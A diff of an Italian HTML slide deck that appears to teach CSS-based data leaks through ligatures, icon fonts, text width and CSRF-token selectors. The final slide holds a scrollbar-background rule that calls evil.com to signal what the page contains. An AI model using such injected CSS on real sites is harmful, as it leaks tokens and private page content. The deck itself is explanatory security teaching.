@@ -174,3 +174,53 @@ form:has(input[name="csrf"][value$="="]) {
     </p-fragment>
   </div>
 </p-slide>
+<p-slide class="center">
+  <h1>Legature</h1>
+  <p-fragment><p>Perché c'è differenza tra</p></p-fragment>
+  <div class="two-columns">
+    <p-fragment>
+      <h1 style="font-variant-ligatures: no-common-ligatures; text-align: end;">fi</h1>
+    </p-fragment>
+    <p-fragment>
+      <h1 style="text-align: start;">fi</h1>
+    </p-fragment>
+  </div>
+</p-slide>
+<p-slide>
+  <pre class="language-css self-center" style="width: 80%;"><code>@font-face {
+  font-family: 'Material Icons';
+  src: local('Material Icons'),
+    url(https://gfonts.com/MaterialIcons.woff) format('woff');
+}</code></pre>
+  <div class="two-columns align-center self-center" style="width: 80%;">
+    <p-fragment>
+      <pre class="language-html"><code>&lt;span class="icon">
+  accessible
+&lt;/span></code></pre>
+    </p-fragment>
+    <p-fragment class="center">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="height: 2.5em;">
+        <circle cx="12" cy="4" r="2"/>
+        <path d="M19 13v-2c-1.54.02-3.09-.75-4.07-1.83l-1.29-1.43c-.17-.19-.38-.34-.61-.45-.01 0-.01-.01-.02-.01H13c-.35-.2-.75-.3-1.19-.26C10.76 7.11 10 8.04 10 9.09V15c0 1.1.9 2 2 2h5v5h2v-5.5c0-1.1-.9-2-2-2h-3v-3.45c1.29 1.07 3.25 1.94 5 1.95zm-6.17 5c-.41 1.16-1.52 2-2.83 2-1.66 0-3-1.34-3-3 0-1.31.84-2.41 2-2.83V12.1a5 5 0 1 0 5.9 5.9h-2.07z"/>
+      </svg>
+    </p-fragment>
+  </div>
+</p-slide>
+<p-slide>
+  <div style="display: flex; gap: 2em; margin: 0 auto 1.5em;">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="height: 2.5em; box-shadow: 0 .25em red;">
+      <circle cx="12" cy="4" r="2"/>
+      <path d="M19 13v-2c-1.54.02-3.09-.75-4.07-1.83l-1.29-1.43c-.17-.19-.38-.34-.61-.45-.01 0-.01-.01-.02-.01H13c-.35-.2-.75-.3-1.19-.26C10.76 7.11 10 8.04 10 9.09V15c0 1.1.9 2 2 2h5v5h2v-5.5c0-1.1-.9-2-2-2h-3v-3.45c1.29 1.07 3.25 1.94 5 1.95zm-6.17 5c-.41 1.16-1.52 2-2.83 2-1.66 0-3-1.34-3-3 0-1.31.84-2.41 2-2.83V12.1a5 5 0 1 0 5.9 5.9h-2.07z"/>
+    </svg>
+    <span style="font-size: 2em; box-shadow: 0 .125em red;">accessible</span>
+  </div>
+  <p-frament>
+    <h3 class="center">Possiamo <em>variare la larghezza</em> del testo</h3>
+  </p-frament>
+</p-slide>
+<p-slide>
+  <pre class="language-css self-center big"><code>::-webkit-scrollbar-track {</code>
+  <p-fragment><code>background: url(http://evil.com/?contains-623);</code></p-fragment>
+<code>}</code></pre>
+  <p-fragment class="landing" style="top: 55%; right: 5%;"><div style="font-size: 2.5em; transform: rotate(20deg);">😱</div></p-fragment>
+</p-slide>
